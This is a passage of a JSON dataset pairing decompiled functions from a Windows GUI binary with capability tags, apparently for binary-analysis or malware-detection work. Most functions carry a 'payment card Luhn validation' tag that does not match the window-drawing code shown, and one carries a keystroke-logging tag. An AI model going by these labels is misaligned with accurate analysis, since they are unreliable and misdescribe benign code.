            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446f18(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x446cb8;\n    fcn.00446cc4(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x448358;\n    uVar4 = 0x4482f0;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00446cf8(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x448328;\n    uVar4 = 0x4482d0;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00446cf8(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x448300;\n    uVar4 = 0x448318;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00446cf8(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x448340;\n    uVar4 = 0x4482e0;\n    iVar1 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00446cf8(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, in_EAX, uVar3, iVar1);\n    return;\n}\n",
        "token_count": 521
    },
    "0044716c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044716c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.0045828c(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.00404154();\n        }\n        else {\n            fcn.0044673c();\n            fcn.0045828c(var_4h, var_8h);\n            fcn.00404154();\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044797c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044797c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00403e30();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.00444c38();\n            fcn.00444c04();\n            fcn.00444f30();\n            fcn.00444f74();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 227
    },
    "00447dbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00447dbc(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 173
    },
    "004483a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004483a4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar3;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x4483bd;\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x4484be;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.004483a4::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.004443dc();\n    pcVar3 = fcn.0044a1bc;\n    uVar1 = fcn.0041c5e0(fcn.0044a1bc, in_EAX);\n    *(in_EAX + 0x1c0) = uVar1;\n    uVar1 = fcn.0042132c();\n    *(in_EAX + 0x1a4) = uVar1;\n    fcn.004214d4();\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1d4) = 0xffffffff;\n    *(in_EAX + 0x1b8) = 3;\n    if (*(*0x492d08 + 4) == 0x11) {\n        fcn.00404da0();\n    }\n    else {\n        fcn.004600bc();\n        fcn.00404df4();\n    }\n    *(in_EAX + 0x1db) = 0;\n    *(in_EAX + 0x192) = *0x4484e4;\n    *(in_EAX + 0x193) = 2;\n    *(in_EAX + 0x194) = 1;\n    *(in_EAX + 0x198) = 1;\n    *(in_EAX + 0x158) = 1;\n    iVar2 = fcn.00452b7c();\n    *(in_EAX + 0x1a0) = iVar2;\n    *(iVar2 + 0x1c) = in_EAX;\n    *(iVar2 + 0x18) = 0x44e6c8;\n    *in_FS_OFFSET = pcVar3;\n    pcStack48 = 0x4484c5;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 651
    },
    "00448b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448b24(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.0044d568();\n    if (cVar1 == '\\0') {\n        fcn.00413a6c();\n    }\n    else {\n        (**(*in_EAX + 0x44))();\n        *param_2 = var_8h;\n        param_2[1] = var_4h;\n    }\n    *param_2 = *param_2 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_2[1] = param_2[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 233
    },
    "00448cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448cb4(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    uint in_EDX;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint *arg_10h;\n    uint var_18h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    arg_10h = &var_10h;\n    arg_ch = *(arg_8h + -8);\n    arg_8h_00 = 0;\n    fcn.00448b24();\n    fcn.00448744(arg_8h_00, arg_ch, arg_10h, in_EDX);\n    return;\n}\n",
        "token_count": 207
    },
    "004490a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004490a4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00403f28();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.00444f18();\n    iVar2 = fcn.00449558();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0044951c();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.0044951c();\n                fcn.00414d8c();\n                fcn.00444c04();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00414eec();\n            fcn.00446870(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 330
    },
    "00449388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449388(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    fcn.00404154();\n    uVar3 = 1;\n    piVar4 = param_2;\n    fcn.00446870(1);\n    uVar2 = 1;\n    fcn.00446870(1);\n    fcn.004492f4(uVar2, uVar3, piVar4);\n    if ((*(param_2 + 7) & 2) == 0) {\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        cVar1 = fcn.004040e4();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.0044d568();\n            if (cVar1 != '\\0') {\n                (**(*param_2 + 0x80))();\n            }\n        }\n        else {\n            fcn.00446870(0);\n            fcn.0044a094();\n        }\n        fcn.00448fe0();\n    }\n    fcn.00446870(1);\n    return;\n}\n",
        "token_count": 299
    },
    "0044947c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044947c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    uVar2 = 0;\n    piVar3 = param_2;\n    fcn.00446870(0);\n    cVar1 = fcn.004040e4(uVar2, piVar3);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            fcn.00445a00();\n        }\n    }\n    else {\n        fcn.004492d4();\n        (**(*param_2 + 0xb0))();\n    }\n    fcn.00449340();\n    fcn.00446870(0);\n    fcn.00446870(0);\n    fcn.0044909c();\n    return;\n}\n",
        "token_count": 210
    },
    "00449558": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00449558(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x1cc) != 0) {\n        iVar1 = *(*(in_EAX + 0x1cc) + 8);\n    }\n    if (*(in_EAX + 0x1d0) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x1d0) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "004495e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004495e8(uint param_1, ushort param_2)\n\n{\n    fcn.00449578(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 46
    },
    "00449ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449ba0(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00446f18();\n    uVar2 = 0x449a20;\n    uVar1 = 0x449a58;\n    uVar3 = in_EAX;\n    fcn.00449ac0(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 150
    },
    "00449ee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00449ee4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x449efa;\n    fcn.00404154();\n    puStack20 = 0x449f07;\n    fcn.0044e6dc();\n    uStack24 = 0x449f40;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*in_EAX + 0xb0))();\n    fcn.0044a094();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x449f47;\n    uStack24 = 0x449f3f;\n    fcn.0044e6dc();\n    return;\n}\n",
        "token_count": 213
    },
    "0044a3c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0044a3c4(int32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_stack_fffffec4;\n    int16_t iStack300;\n    int16_t iStack298;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack44 [4];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    \n    sub.user32.dll_GetMessagePos();\n    uVar2 = fcn.00406c3c();\n    iStack300 = uVar2;\n    iStack296 = iStack300;\n    iStack298 = uVar2 >> 0x10;\n    iStack292 = iStack298;\n    iStack36 = 0x44a400;\n    fcn.004450dc();\n    if (param_1 == 0) {\n        iStack36 = 0;\n        in_stack_fffffec4 = 0;\n        param_1 = fcn.0044a300(0, 0);\n    }\n    if (param_1 == 0) {\n        return 0;\n    }\n    iStack40 = in_stack_fffffec4;\n    if (in_EAX != param_1) {\n        iStack40 = in_stack_fffffec4 - *(param_1 + 0x40);\n        iStack36 = iStack36 - *(param_1 + 0x44);\n    }\n    uStack32 = *(param_2 + 8);\n    uStack24 = *(param_2 + 4);\n    uVar3 = *(param_2 + 10);\n    if (uVar3 < 0x201) {\n        if (uVar3 - 0xa1 < 2) {\ncode_r0x0044a4a5:\n            uStack28 = 0;\n            goto code_r0x0044a4cb;\n        }\n        if (uVar3 - 0xa4 < 2) {\ncode_r0x0044a4b9:\n            uStack28 = 1;\n            goto code_r0x0044a4cb;\n        }\n        uVar3 = uVar3 - 0xa7;\n    }\n    else {\n        if (uVar3 - 0x201 < 2) goto code_r0x0044a4a5;\n        if (uVar3 - 0x204 < 2) goto code_r0x0044a4b9;\n        uVar3 = uVar3 - 0x207;\n    }\n    if (uVar3 < 2) {\n        uStack28 = 2;\n    }\n    else {\n        uStack28 = 0;\n    }\ncode_r0x0044a4cb:\n    sub.user32.dll_GetKeyboardState(&stack0xfffffed8);\n    uVar1 = fcn.00458324();\n    uStack32._0_2_ = CONCAT11(uVar1, uStack32);\n    uStack32 = uStack32 & 0xffff0000 | uStack32;\n    uVar2 = fcn.00446870(&stack0xffffffd4);\n    *(param_2 + 0xc) = uVar2;\n    return 1;\n}\n",
        "token_count": 761
    },
    "0044bab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bab8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404154();\n    fcn.00404154(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 75
    },
    "0044cba4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044cba4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint lpwndpl;\n    uint var_10h;\n    \n    if ((((in_EDX == in_EAX[0x10]) && (in_ECX == in_EAX[0x11])) && (arg_ch == in_EAX[0x12])) && (arg_8h == in_EAX[0x13])\n       ) {\n        return;\n    }\n    cVar1 = fcn.0044d568();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(in_EAX[0x6d]),  iVar2 != 0)) {\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            lpwndpl = 0x2c;\n            sub.user32.dll_GetWindowPlacement(in_EAX[0x6d], &lpwndpl);\n            fcn.00444ebc();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(in_EAX[0x6d], 0);\n    }\n    fcn.00444a80();\n    fcn.0044829c();\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 398
    },
    "0044cc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044cc80(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00449558(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0044951c();\n            fcn.00404154();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0044d0cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044d0cc(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x44d0db;\n    fcn.00444ebc();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x1b4), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 149
    },
    "0044d574": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044d574(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x1b4);\n    puStack80 = 0x44d588;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x44d5be;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x44d5a5;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x1b4);\n    uStack96 = 0x44d5cc;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x1b4);\n        puStack104 = 0x44d5e1;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.00444a80();\n    return;\n}\n",
        "token_count": 643
    },
    "0044d80c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d80c(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00449558();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0044951c();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0044e728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e728(int32_t *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    if ((*(in_EAX + 7) & 2) == 0) {\n        cVar1 = fcn.0044d568();\n        if (cVar1 == '\\0') {\n            *param_1 = in_EAX[0x12];\n            param_1[1] = in_EAX[0x13];\n        }\n        else {\n            (**(*in_EAX + 0x44))();\n            *param_1 = iStack16;\n            param_1[1] = iStack12;\n        }\n    }\n    else if ((*(param_2 + 0x1c) & 0x10) == 0) {\n        *param_1 = *(in_EAX + 0x242);\n        param_1[1] = *(in_EAX + 0x246);\n    }\n    *param_1 = *param_1 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_1[1] = param_1[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 328
    },
    "0044ea40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044ea40(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x44ea51;\n    var_4h = in_EAX;\n    uStack16 = fcn.0044d1c8();\n    puStack20 = 0x44ea57;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x44ea96;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xdc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44ea9d;\n    uStack24 = var_8h;\n    uStack28 = 0x44ea8f;\n    uStack28 = fcn.0044d1c8();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 266
    },
    "0044eaa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044eaa4(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x44eb3d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.00420c18();\n    uVar1 = fcn.00447f3c();\n    fcn.004455ac(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.00405264();\n    uVar2 = fcn.00421c8c(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.00404da0(0x44eb44);\n    return;\n}\n",
        "token_count": 284
    },
    "0044ee48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044ee48(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xe0))();\n    return;\n}\n",
        "token_count": 46
    },
    "0044ee70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ee70(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00413a94(arg_8h, 0);\n    uVar1 = fcn.00447f3c();\n    uVar2 = fcn.00405264(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.00421c8c(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 184
    },
    "0044ef60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ef60(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 120
    },
    "0044f3ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f3ac(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00450884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450884(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00413a94(&var_1ch, *(*(arg_8h + -4) + 0x18) + in_EDX + -2);\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00421c8c(&var_1ch, 1, 0);\n        sub.user32.dll_DrawFrameControl(uVar2);\n    }\n    else {\n        fcn.00437d14();\n        fcn.004383e0();\n        arg_ch = &var_1ch;\n        arg_8h_00 = 0;\n        uVar2 = fcn.00421c8c();\n        fcn.00437d14(uVar2);\n        fcn.00437f28(arg_8h_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "004509a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004509a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00413a94(&var_1ch, arg_8h);\n    fcn.00437d14();\n    fcn.00438144();\n    arg_ch_00 = &var_1ch;\n    arg_8h_00 = 0;\n    uVar1 = fcn.00421c8c();\n    fcn.00437d14(uVar1);\n    fcn.00437f28(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 173
    },
    "004516dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
